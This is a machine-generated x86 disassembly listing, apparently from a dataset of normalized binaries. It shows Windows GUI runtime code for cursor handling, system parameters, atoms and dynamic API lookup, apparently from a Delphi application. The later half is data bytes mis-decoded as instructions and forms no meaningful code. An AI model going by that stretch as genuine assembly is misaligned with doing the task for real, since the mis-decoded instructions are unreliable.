mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_447858
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4487fc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_447858
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43dc90
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4491a7
lea eax [ ebp - 0x48 ]
call sub_403fe0
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_444968
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43c9ac
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43ee80
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fe0
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_448cb0
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443498
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4488b0
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_448d38
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4488b0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_447858
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43e06c
jmp r-xdata
mov eax edi
call sub_45a9fc
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_447858
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43daec
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43e14c
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404034
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44879c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c0fc
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_444968
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43e7f4
jmp r-xdata
sub_4491b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_449324
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_449240
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4492fc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4492a4
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4492d4
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406af0
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_4492fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449270
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_449324
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_449288
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4492a4
pop ebx
retn
mov eax ebx
call sub_4492d4
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_449388
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4494ee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44960c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4495f0
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_4495f0
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_4496fc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403290
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403290
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403290
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fe0
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fe0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_449784
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4498fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408c10
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404034
mov eax [ rw-data ]
call sub_4044a0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c10
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404034
mov eax [ rw-data ]
call sub_4044a0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4044a0
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c88
mov [ rw-data ] eax
call sub_449388
mov dl 0x1
mov eax [ r-xdata ]
call sub_4491b0
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b9d8
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45cabc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45e6a4
mov ecx r-xdata
mov edx sub_43b208
mov eax [ r-xdata ]
call sub_41343c
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449903
lea eax [ ebp - 0x10 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44996c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4499cb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4499d2
retn
mov eax rw-data
call sub_40cdfc
call sub_4496fc
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a68
mov eax rw-data
call sub_403fe0
mov eax rw-data
call sub_403fe0
sub_4499d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_449a5a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449a61
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_449784
mov eax [ r-xdata ]
call sub_4132b0
mov eax [ r-xdata ]
call sub_413350
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
sub_449b14
mov esp 0xe80044a2
mov [ 0xffffffffa1cc0044 ] al
inc esp
add ah bl
mov eax [ 0x54100044 ]
inc ebx
outsd
outsb
je r-xdata
or [ esp + edx * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x3c00408d
fwait
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
jae r-xdata
outsb
je r-xdata
push esp
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
int3
add [ edi + edx * 4 + 0x40300041 ] ah
outsb
inc edx
popad
jae r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax - 0x53ffbb5d ] bl
movsd [ edi ] [ esi ]
inc esp
add al ch
movsb [ edi ] [ esi ]
jo r-xdata
inc esp
add [ eax + eax ] al
std
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 - 0x5c67ffbf ] bh
inc esp
add [ ebp - 0x5b17ffbc ] ch
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x9c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 - 0x6341ffbc ] ah
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah cl
and eax 0x10000041
inc eax
add [ eax + r-xdata ] dl
add edx [ eax ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
fwait
inc esp
add [ eax ] cl
popad
jae r-xdata
inc ecx
add [ eax + ebx * 4 + 0x41 ] bh
add [ eax ] ch
xchg edi eax
inc ecx
add [ eax ] dh
inc eax
outsb
inc ebp
outsb
popad
inc esp
add [ eax ] ch
add [ eax ] al
inc eax
and eax [ ecx ]
pushfd
fwait
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
pushfd
outsd
jb r-xdata
inc esp
add [ ecx + eax * 2 ] dl
inc ecx
add [ edx + esi + 0x40 ] al
add [ esp ] al
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
jo r-xdata
xor al [ eax ]
add al 0xa4
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
outsb
sub_449ca8
stc
push ebx
push eax
call [ esp + 0x44 ]
add [ esp - 0x595fffbc ] bl
inc esp
add al al
cmpsb [ esi ] [ edi ]
inc esp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
mov [ ebx + r--data ] bl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
rcr [ esp + eax * 2 + 0x8000800 ] 0x1
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0xa4
inc esp
add [ ecx + eax * 2 ] dl
inc ecx
add [ edi + edx * 4 + 0x40300041 ] ah
in al dx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
arpl [ ebp + 0x74 ] si
mov [ gs : ecx ] dl
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb16c0006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add al dl
pushfd
inc esp
add [ eax ] cl
add [ eax ] cl
fwait
inc esp
add [ eax ] bl
add bh bh
loopne r-xdata
inc ecx
add [ eax + ebx * 4 + 0x41 ] bh
add [ eax ] ch
movsd [ edi ] [ esi ]
inc esp
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax - 0x53ffbb5d ] bl
movsd [ edi ] [ esi ]
inc esp
add al ch
movsb [ edi ] [ esi ]
inc esp
add [ ebx ] cl
push esp
inc ecx
add [ eax ] dh
inc eax
xor al 0x40
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp al 0x24
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x9d480000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449d ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6800449d ] al
add [ eax ] al
add [ eax ] ah
pushfd
inc esp
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
inc ecx
add ah bl
inc edi
inc ecx
add [ eax - 0x1bffbead ] bh
dec ecx
inc ecx
add [ eax - 0xbffbeb6 ] bh
push ebx
inc ecx
add [ esp + edx * 2 ] al
inc ecx
add [ ebx + ecx * 2 ] bl
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ esp + ecx * 2 ] bl
inc ecx
add [ ebp + ecx * 2 + 0x4e0c0041 ] dh
inc ecx
add [ eax + 0x4400414e ] ah
push ecx
inc ecx
add [ eax + 0x51 ] ah
inc ecx
add [ eax + 0x54 ] bl
inc ecx
add [ eax + 0x68004152 ] ch
push esi
inc ecx
add [ eax + 0x56 ] bh
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ebp + eax * 2 + 0x41 ] cl
add [ esp + eax * 2 + 0x41 ] al
add [ eax ] ah
push ebx
inc ecx
add [ ebx + edx * 2 + 0x41 ] dl
add al ch
xor al 0x40
add ah ch
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
mov [ gs : ecx ] dl
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ edx + esi + 0x40 ] al
inc ebx
jne r-xdata
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
js r-xdata
inc ebx
push 0x65676e61
mov [ ebx + 0x500044 ] bl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add ah cl
test al 0x44
add [ ecx + ebp * 4 ] bl
inc esp
add [ edi + edx * 4 + 0x40300041 ] ah
inc ecx
add [ eax + ebx * 4 + 0x41 ] bh
inc eax
dec esp
imul esi [ ebx + 0x74 ] 0x9f80c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax + 0x53 ] bl
inc ecx
popad
je r-xdata
add [ eax ] al
add al [ eax ]
out dx al
jl r-xdata
inc ebx
jne r-xdata
inc ecx
add [ ebx + edx * 2 + 0x41 ] bl
add [ eax ] dh
dec eax
inc ecx
add al dl
push esp
inc ecx
add [ edx * 2 + 0x56000041 ] ch
inc ecx
add al dh
dec esi
inc ecx
add [ esi + edx * 2 ] bh
inc ecx
add [ eax - 0xfffbeaa ] dh
scasb [ edi ]
inc esp
add al ah
push eax
inc ecx
add [ ebx + eax * 2 + 0x517c0041 ] cl
inc ecx
add [ ecx + edx * 2 + 0x52280041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 4 + 0x44 ] ch
add [ eax ] dh
add [ eax ] al
add [ eax ] ch
sbb eax [ ecx ]
fdiv [ eax + eax * 2 ]
add ah ah
xor al 0x40
lea eax [ eax ]
aam 0x9e
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449f ] al
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x9ff00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44 ] al
add [ eax + 0x44a0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x60 ] ah
inc esp
add [ eax + 0x44 ] dh
add [ eax + 0x64000000 ] ah
0x9b9c0044 0x41
in al 0x34
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
int3
add al bl
popfd
inc ecx
add ah ch
mov eax [ 0xffffffffade80044 ]
inc esp
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax - 0x58 ] bh
inc esp
add [ eax + 0x3c00419e ] bl
sahf
inc ecx
add al dl
popfd
inc ecx
add [ eax ] al
sahf
inc ecx
add ah dl
popfd
inc ecx
add [ eax - 0x5d ] al
inc esp
add [ eax ] dl
lodsb [ esi ]
inc esp
add [ eax - 0x1bffbb55 ] ch
scasb [ edi ]
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc ecx
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb [ ecx + eax * 2 ] bl
sub_44a0b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ esi + ebp * 4 + 0x44 ] bl
add [ 0x73754354 ] cl
je r-xdata
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax - 0x27ffbedc ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ ecx + eax * 2 + 0x419c8400 ] bl
add [ esp + ebx * 4 - 0x62e3ffbf ] bh
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov [ eax + 0xd070044 ] ah
push esp
inc ebx
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d78
test bl bl
jle r-xdata
mov edx esi
call sub_44a590
inc ecx
add al dh
pushfd
popfd
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
inc ecx
add [ eax ] ah
popfd
inc ecx
add [ eax - 0x64 ] al
inc ecx
add ah dl
pushfd
inc ecx
add [ eax ] ch
popfd
inc ecx
add [ eax - 0x6bffbb59 ] al
cmpsd [ esi ] [ edi ]
inc esp
add [ eax - 0x43ffbb59 ] ch
cmpsd [ esi ] [ edi ]
inc esp
add al dl
cmpsd [ esi ] [ edi ]
inc esp
add ah ah
